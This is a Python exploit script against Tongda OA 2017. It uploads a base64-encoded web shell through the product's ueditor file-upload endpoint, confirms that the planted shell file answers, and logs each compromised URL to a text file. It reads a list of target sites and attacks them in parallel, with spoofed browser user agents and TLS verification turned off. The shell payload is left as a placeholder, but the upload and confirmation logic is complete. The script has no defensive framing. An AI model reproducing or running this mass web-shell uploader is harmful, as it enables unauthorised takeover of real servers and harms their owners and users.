#通達OA 2017
import sys
import base64
from fake_useragent import UserAgent
from multiprocessing import Pool
import requests
requests.packages.urllib3.disable_warnings()

def Up_shell(url):
    try:
        upurl=url+"/module/ueditor/php/action_upload.php?action=uploadfile"
        ua = UserAgent()
        headers = {
            'Content-Type' : 'multipart/form-data; boundary=---------------------------55719851240137822763221368724',
            'User-Agent' : str(ua.chrome),
            'X_requested_with' : 'XMLHttpRequest',
            'Accept-Encoding' : 'gzip'
        }
        shcode=" ----YOU base64 shell code---- "
        requests.post(url=upurl,headers=headers,data=base64.b64decode(shcode),verify=False)
        return True
    except:
        return False

def confirm_shell(url):
    try:
        ua = UserAgent()
        header = {'User-Agent':str(ua.chrome)}
        curl=url+"/up1oad_fi1e.php"
        ch=requests.get(url = curl,verify=False,headers=header)
        if ch.status_code == 200:
            print(curl)
            f = open('2017OA shell.txt','a+',encoding="UTF-8")
            f.write("%s MDFK\n" % (curl))
            f.close()
    except:
        pass

def exploit(url):
    if Up_shell(url):
        confirm_shell(url)

if __name__== "__main__":
    importdata = sys.argv[1]
    with open(importdata, 'r',encoding="UTF-8") as f:
        allurl = f.readlines()
    
    p = Pool()
    for url in allurl:
        if "https://" not in url:
            if "http://" not in url:
                url="http://"+url
        url=url.strip("\n")
        if url.endswith("/"):
            url = url[:-1]
        p.apply_async(exploit,args=(url,))
    p.close()
    p.join()    